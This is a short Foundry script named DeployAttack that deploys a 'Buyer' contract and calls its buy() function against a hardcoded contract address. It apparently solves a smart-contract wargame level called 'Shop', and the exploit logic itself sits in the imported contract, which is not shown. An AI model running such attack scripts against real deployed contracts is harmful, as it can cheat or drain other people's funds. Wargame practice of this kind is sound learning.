// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {Buyer} from "../src/21-Shop/Buyer.sol";

contract DeployAttack is Script{
    address private constant TARGET_ADDRESS = 0xe305FbB022a127E279d75F2cADd913ff05C1B56D;

    function run() public {
        uint256 pk = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(pk);
        Buyer buyer = new Buyer();
        buyer.buy();
        vm.stopBroadcast();
    }

}